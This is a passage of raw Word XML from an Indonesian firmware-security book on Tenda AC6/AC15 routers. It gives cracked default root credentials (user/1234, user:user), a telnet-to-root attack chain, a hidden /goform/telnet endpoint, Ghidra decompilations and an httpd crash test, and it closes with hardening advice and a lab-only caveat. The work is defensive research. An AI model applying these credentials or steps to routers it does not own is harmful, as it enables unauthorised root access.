        <w:br/>
        <w:t>Ukuran: 6,819,906 byte</w:t>
        <w:br/>
        <w:t>MD5  : 990011d052e061d842ab9a7007a20b86</w:t>
        <w:br/>
        <w:t>SHA256: 8afd50e3cddeb79030759cf73095fb3eb0ec20459f6a67fa419544d3f6e0b3bf</w:t>
        <w:br/>
        <w:t>Sumber: static.tenda.com.cn (AC6 v2.0 Firmware_V15.03.06.52)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 Alternatif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TFTP: set IP PC 192.168.0.2, jalankan TFTP server yang menyajikan .bin, masuk mode recovery seperti di atas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UART serial (3.3V TTL): buka casing, sambung USB-TTL ke header GND/TX/RX/VCC, lihat log boot, hentikan bootloader, dan reflash. Metode paling pasti (sekaligus latihan hardware hacking).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Timeline Uji (Ringkas)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Waktu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Aksi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bypass user:user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Cookie sesi didapat (302 + Set-Cookie)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getProduct dengan cookie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JSON -&gt; sesi sah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ssid=TESTPROBE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{"errCode":0} (handler menyimpan ssid)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Matriks ssid N=64..500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{"errCode":0}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Matriks ssid N=600..800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000 (koneksi drop / httpd crash)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ping 70 dtk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tetap UP (yang crash proses httpd, bukan kernel)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Setelah beberapa saat / power-cycle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LAN+WiFi tidak naik (CFG rusak)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Rencana pemulihan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Web Mode + firmware resmi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Status Emulasi (Mengapa Ini Penting)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Emulasi firmware (FirmAE/qemu) sempat membuat `bin/httpd` LISTEN di 192.168.0.1:80, tetapi request tidak dilayani karena ketergantungan CFM (Realtek).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Analisis: client CFM di libCfm memakai socket AF_UNIX **SOCK_DGRAM**; `cfm_stub` buatan kita sudah bind ke /var/cfm_socket (terlihat di /proc/net/unix) tetapi httpd tetap melaporkan `connect: Connection refused`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`LD_PRELOAD` diabaikan karena loader uClibc (perangkat memakai `/lib/ld-uClibc.so.0`), sehingga teknik hook ala writeup tidak langsung jalan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kesimpulan: untuk RCE penuh, lanjutkan di emulasi/harness dengan pendekatan yang benar (stub libCfm/cfm client atau patch alur CFM), BUKAN di perangkat asli.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Aturan Aman (Checklist Sebelum Uji)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Selalu reproduksi di emulasi/VM terisolasi tanpa rute ke LAN produksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Verifikasi crash di proses (HTTP), bukan hanya ping — crash userspace tidak menurunkan ping.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Untuk endpoint 'setter', asumsikan input disimpan ke CFG/NVRAM: batasi panjang, siapkan firmware pemulihan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Siapkan selalu: mode recovery + firmware resmi + (idealnya) akses UART sebelum menyentuh hardware.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan pernah menguji payload memori ke perangkat yang dipakai sehari-hari.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VI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Temuan Lanjutan (Backdoor, Privesc, Root Shell)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Temuan pada rootfs Tenda (keluarga firmware sama dengan studi kasus). Data pribadi diredaksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>F-02 — Akun Sistem ber-UID 0 dengan Password Lemah (Privesc)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/etc_ro/passwd</w:t>
        <w:br/>
        <w:t>root:$1$...:0:0:root:/:/bin/sh</w:t>
        <w:br/>
        <w:t>admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh</w:t>
        <w:br/>
        <w:t>support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh</w:t>
        <w:br/>
        <w:t>user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh</w:t>
        <w:br/>
        <w:t>nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PERHATIKAN kolom UID/GID = 0:0 pada SEMUA akun. Artinya admin/support/user/nobody adalah ROOT (tidak ada pemisahan hak akses).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Verifikasi password (DES crypt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ perl -e 'print crypt("1234",$ARGV[0])' 6H   # salt '6H'</w:t>
        <w:br/>
        <w:t>6HgsSsJIEOc2U   -&gt; cocok dengan hash 'admin'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Hasil: admin:1234, support:1234, user:1234, nobody:1234  (semua VALID)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67460"/>
            <wp:docPr id="2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40_default_cf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L3.1 Kredensial dasar bawaan + akun UID 0 dengan password 1234.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dampak: siapa pun di LAN yang tahu salah satu akun ini memperoleh hak ROOT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>F-03 — Telnetd Aktif Saat Boot (Root Shell via Telnet)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/etc_ro/init.d/rcS  (dijalankan sebagai PID 1 proses init)</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>cfmd &amp;</w:t>
        <w:br/>
        <w:t>udevd &amp;</w:t>
        <w:br/>
        <w:t>logserver &amp;</w:t>
        <w:br/>
        <w:t>tendaupload &amp;</w:t>
        <w:br/>
        <w:t>moniter &amp;</w:t>
        <w:br/>
        <w:t>telnetd &amp;            &lt;-- daemon telnet dinyalakan otomatis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kombinasi F-02 + F-03: `telnet &lt;router&gt;` → login `user` / `1234` → **shell root**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Diuji juga via nmap: port 23/tcp terbuka pada perangkat berfirmware ini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ini adalah backdoor klasik Tenda: akun default UID 0 + telnetd menyala saat boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>F-04 — Endpoint Tersembunyi /goform/telnet (Backdoor On-Demand)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>strings /bin/httpd | grep -i telnet</w:t>
        <w:br/>
        <w:t xml:space="preserve">  /goform/telnet</w:t>
        <w:br/>
        <w:t xml:space="preserve">  TendaTelnet</w:t>
        <w:br/>
        <w:t xml:space="preserve">  killall -9 telnetd</w:t>
        <w:br/>
        <w:t xml:space="preserve">  telnetd -b %s &amp;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  load telnetd success.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// hasil decompile Ghidra: TendaTelnet @ 0x0004fb88</w:t>
        <w:br/>
        <w:t>void TendaTelnet(undefined4 param_1)</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  GetValue(..., &amp;local_130);                    // ambil nilai (mis. port/flag)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  system("killall -9 telnetd");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  doSystemCmd("telnetd -b %s &amp;", &amp;local_130);    // &lt;-- menyalakan telnet jarak jauh</w:t>
        <w:br/>
        <w:t xml:space="preserve">  send_msg_to_netctrl(0x13, ...);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  FUN_0002c43c(param_1, "...");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48703"/>
            <wp:docPr id="2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41_tenda_teln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4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L3.2 Endpoint /goform/telnet → TendaTelnet() menyalakan telnetd.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dampak: penyerang dapat MENGAKTIFKAN telnet dari jarak jauh lewat HTTP, lalu login root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>F-08 — Permukaan Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>strings /bin/httpd | grep -E 'doSystemCmd|popen|sprintf|/bin/sh'</w:t>
        <w:br/>
        <w:t xml:space="preserve">  doSystemCmd</w:t>
        <w:br/>
        <w:t xml:space="preserve">  popen</w:t>
        <w:br/>
        <w:t xml:space="preserve">  sprintf</w:t>
        <w:br/>
        <w:br/>
        <w:t># Fungsi CVE terkait (keluarga yang sama):</w:t>
        <w:br/>
        <w:t>#  formSetSysToolDDNS, formSetSpeedWan, addressNat, fast_setting_wifi_set, ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pola: input HTTP dimasukkan ke perintah shell (`ping`/`traceroute`/skrip) tanpa sanitasi → RCE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>F-11 — Telemetri / Partner Pihak Ketiga (Privasi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>URL pihak ketiga yang ditemukan di rootfs:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  room.9158.com/ktv_new/integrate_hall.aspx</w:t>
        <w:br/>
        <w:t xml:space="preserve">  yuancheng.xunlei.com            (Xunlei)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  wifi.yunos.com/aliwifi/down.htm (YunOS/Alibaba)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  www.baidu.com</w:t>
        <w:br/>
        <w:t xml:space="preserve">  (domains di HP_P1008.img / konfigurasi vendor)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bukan malware klasik, namun indikasi telemetri/iklan partner &amp; panggilan keluar yang perlu diaudit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">F-12 — Root via Konsol Serial (Sulogin) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/etc_ro/inittab</w:t>
        <w:br/>
        <w:t>ttyS0::respawn:/sbin/sulogin    &lt;-- seri console (UART) meminta login root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dengan akses UART (lihat bab Hardware Hacking), penyerang dapat mencoba login konsol root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Rantai Serangan (Ringkas)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Langkah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Aksi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 LAN / port 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Menemukan telnetd &amp; web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web `user:user` (kredensial dasar)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Sesi admin (bypass)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Telnet `user`/`1234` (akun UID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 ROOT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ATAU panggil `/goform/telnet` untuk menyalakan telnet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 ROOT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Dari root: baca konfigurasi, ubah firmware, persist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Kontrol penuh perangkat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Rekomendasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update firmware (menutup akun default &amp; telnet).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan pernah mengekspos admin/telnet ke WAN; pisahkan di LAN terpercaya/VLAN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan telnet; gunakan SSH bila perlu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ganti/hapus akun default; pastikan tidak ada akun ber-UID 0 yang tidak perlu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan UPnP/cloud bila tidak dipakai; matikan WPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lakukan audit firmware (analisis statis) sebelum dipakai di lingkungan sensitif.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VII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Bukti Backdoor user:user (Ghidra)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dibuktikan dengan Ghidra pada binary httpd Tenda asli — bukan tebakan</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Jalan Pintas yang Berhasil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Koreksi arsip: rootfs pada buku ini diekstrak dari firmware perangkat sendiri, dan biner httpd yang dianalisis adalah biner asli perangkat tersebut (lihat firmware/httpd di repo) — bukan dari repositori publik.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/bin/httpd (web server Tenda) — ELF 32-bit ARM, stripped, 991 KB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rootfs publik (Tenda AC15, firmware V15.03.05.18) — diekstrak lewat GitHub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path di binary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.../UGW5.0_AC_PRODUCT/prod/httpd/11ac/cgi/...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Bukti codebase sama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Berisi endpoint /login/Auth DAN fungsi CVE: formSetPPTPServer, formSetSpeedWan, addressNat, fast_setting_wifi_set, formSetClientState, formSetDeviceName, formSetMacFirewallCfg, /cgi-bin/DownloadFlash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Catatan arsitektur: AC15 = ARM, sedangkan AC6 v2 Anda = MIPS (RTL8197F). Namun keduanya dibangun dari sumber Tenda yang sama (UGW5.0) dengan daftar endpoint &amp; fungsi CVE yang identik, sehingga logika autentikasinya representatif untuk perangkat Anda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Bukti Kredensial Bawaan (default.cfg)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>File konfigurasi bawaan webroot memuat kredensial default pabrik:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sys.baseusername=user        &lt;-- akun dasar: 'user'</w:t>
        <w:br/>
        <w:t>sys.baseuserpass=user        &lt;-- password dasar: 'user'</w:t>
        <w:br/>
        <w:t>sys.username=admin</w:t>
        <w:br/>
        <w:t>sys.userpass=                 (kosong)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Inilah </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>backdoor `user` / `user`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>: akun 'base' (dasar) dengan password sama. Ini persis kombinasi yang kita pakai untuk bypass di router AC6 Anda. Akun ini berasal dari firmware, bukan dari password yang Anda setel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>(Sebagai pembanding, /etc_ro/passwd juga memuat akun sistem `user`/`support` yang di beberapa firmware dapat login telnet dengan password `1234`.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Membaca Kode di Ghidra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Kami menganalisis `httpd` dengan Ghidra (auto-analysis), lalu menelusuri string kunci `sys.baseuserpass`, `/login/Auth`, dan `loginPwd` lewat XREF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Fungsi fromSysToolBaseUser (menangani akun dasar user:user)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Ghidra mendekompilasi fungsi ini; perhatikan ia membaca `sys.baseusername` dan `sys.baseuserpass`, lalu membandingkannya (strcmp) dan bisa menggantinya.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06a_baseus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19. Ghidra (live): fromSysToolBaseUser membaca GetValue("sys.baseusername")/"sys.baseuserpass".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Fungsi R7WebsSecurityHandler (gerbang autentikasi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>`R7WebsSecurityHandler` adalah handler keamanan web (nama ini juga terkait CVE-2018-5767). Di sinilah permintaan diperiksa apakah sudah terautentikasi atau belum.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06b_sechandl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20. Ghidra (live): R7WebsSecurityHandler — gerbang auth web server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 String /login/Auth dan XREF-nya</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>String `/login/Auth` (endpoint login yang kita tembak di AC6) terlihat di Listing beserta XREF ke fungsi yang memakainya.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06c_loginst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21. Ghidra (live): string s_/login/Auth_000dc2a0 + XREF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Potongan Kode (Decompiler)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 fromSysToolBaseUser</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>void fromSysToolBaseUser(undefined4 param_1)</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  char acStack_64 [32];             // pass</w:t>
        <w:br/>
        <w:t xml:space="preserve">  char acStack_44 [32];             // user</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">  GetValue("sys.baseusername", acStack_44);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  GetValue("sys.baseuserpass", acStack_64);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  iVar1 = strcmp(acStack_44, local_14);          // bandingkan username</w:t>
        <w:br/>
        <w:t xml:space="preserve">  if (((iVar1 == 0) &amp;&amp; (iVar1 = strcmp(acStack_64, local_18), iVar1 == 0)) &amp;&amp; ...) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      SetValue("sys.baseusername", local_1c);   // ganti user</w:t>
        <w:br/>
        <w:t xml:space="preserve">      SetValue("sys.baseuserpass", local_20);   // ganti pass</w:t>
        <w:br/>
        <w:t xml:space="preserve">      CommitCfm();</w:t>
        <w:br/>
        <w:t xml:space="preserve">  } else {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      FUN_0002be7c(param_1, "password_error.asp");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 SysToolpassword (membaca kredensial)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>void SysToolpassword(undefined4 param_1)</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">  GetValue("...", local_58);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  GetValue("...", &amp;local_60);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  FUN_0002c43c(param_1, ...);      // kirimkan nilai ke klien (info disclosure)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ...</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 FUN_000320b4 (perbandingan password)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>...</w:t>
        <w:br/>
        <w:t>GetValue("...", auStack_54);</w:t>
        <w:br/>
        <w:t>FUN_00010bcc(acStack_94, auStack_54, 0x40);   // decode</w:t>
        <w:br/>
        <w:t>iVar2 = strcmp(acStack_94, param_1);          // bandingkan password</w:t>
        <w:br/>
        <w:t>if (iVar2 != 0) local_14 = 0;                 // salah</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Kesimpulan &amp; Kaitan ke Eksploit Anda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kredensial `user:user` pada AC6 Anda BUKAN hasil tebak-tebakan maupun crack password Anda — ia adalah **akun dasar bawaan firmware** (`sys.baseusername`/`sys.baseuserpass`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pada AC6 v2, login `user:user` mengembalikan 302 + Set-Cookie admin (bypass). Di codebase Tenda yang sama (AC15), kita melihat fungsi yang membaca &amp; membandingkan akun dasar tersebut langsung di Ghidra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Karena ini backdoor firmware, **mengganti password admin tidak menutupnya** — perbaikannya adalah update firmware atau ganti perangkat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Selain itu, endpoint Set* (mis. formSetPPTPServer, SetSpeedWan, addressNat, fast_setting_wifi_set) hadir di binary yang sama — target RE untuk buffer overflow (lihat Volume 2).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Reproduce</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 1) Ambil binary (contoh dari rootfs publik)</w:t>
        <w:br/>
        <w:t>curl -O https://raw.githubusercontent.com/&lt;repo&gt;/rootfs/bin/httpd</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2) Analisis dengan Ghidra (headless dulu)</w:t>
        <w:br/>
        <w:t>support/analyzeHeadless /tmp/gh_httpd proj -import ./httpd</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3) Cari string &amp; XREF (script Ghidra)</w:t>
        <w:br/>
        <w:t>#    sys.baseusername / sys.baseuserpass / /login/Auth / loginPwd</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4) Dekompilasi: fromSysToolBaseUser, R7WebsSecurityHandler, SysToolpassword</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Hanya untuk perangkat milik sendiri / lab berizin.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VIII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
